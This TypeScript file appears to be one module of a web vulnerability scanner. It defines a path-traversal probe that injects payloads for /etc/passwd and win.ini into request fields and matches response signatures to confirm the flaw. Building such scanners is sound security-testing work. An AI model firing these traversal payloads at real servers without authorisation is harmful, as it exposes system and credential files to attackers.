import type { Probe, ProbeVariant } from "../types";
import { registerProbe } from "../registry";
import type { ProbeContext } from "../../types";

const PAYLOADS = [
  "../../../../etc/passwd",
  "..%2f..%2f..%2f..%2fetc%2fpasswd",
  "....//....//....//etc/passwd",
  "..\\..\\..\\..\\windows\\win.ini",
];

const SIGNATURES = [
  /root:x:0:0/,
  /daemon:x:1:1/,
  /\[extensions\]/i,
  /for 16-bit app support/i,
];

function injectIntoFirstValue(ctx: ProbeContext, payload: string): ProbeContext {
  if (ctx.body) {
    try {
      const j = JSON.parse(ctx.body) as Record<string, unknown>;
      const key = Object.keys(j).find((k) => typeof j[k] === "string") ?? Object.keys(j)[0];
      if (key) {
        j[key] = payload;
        return { ...ctx, body: JSON.stringify(j) };
      }
    } catch { /* fall through */ }
  }
  try {
    const url = new URL(ctx.url);
    const first = [...url.searchParams.keys()][0];
    if (first) {
      url.searchParams.set(first, payload);
      return { ...ctx, url: url.toString() };
    }
  } catch { /* ignore */ }
  return ctx;
}

const variant: ProbeVariant = {
  id: "traversal.path",
  label: "Traversal · path",
  group: "injection",
  severity: "high",
  mutate(ctx) {
    return injectIntoFirstValue(ctx, PAYLOADS[Math.floor(Math.random() * PAYLOADS.length)]!);
  },
  detect(req) {
    if (req.status === "ERR" || !req.bodyText) return null;
    for (const rx of SIGNATURES) {
      const m = rx.exec(req.bodyText);
      if (m) {
        return {
          variantId: variant.id,
          probeId: "inj.traversal",
          probeLabel: "Path Traversal",
          group: "injection",
          verdict: "CONFIRMED",
          severity: "high",
          confidence: 0.95,
          evidence: `File signature matched in response: "${m[0]}"`,
          requestUrl: req.url,
          requestMethod: req.method,
          requestBody: req.requestBody,
          responseSnippet: req.bodyText.slice(0, 400),
        };
      }
    }
    return null;
  },
};

export const traversalProbe: Probe = {
  id: "inj.traversal",
  label: "Path Traversal",
  group: "injection",
  description:
    "Injects path-traversal payloads (URL-encoded and raw) into the first query param or body field, " +
    "then scans the response for /etc/passwd or win.ini signatures.",
  appliesTo(ctx) {
    return ctx.method !== "HEAD" && ctx.method !== "OPTIONS";
  },
  variants: [variant],
};

registerProbe(traversalProbe);
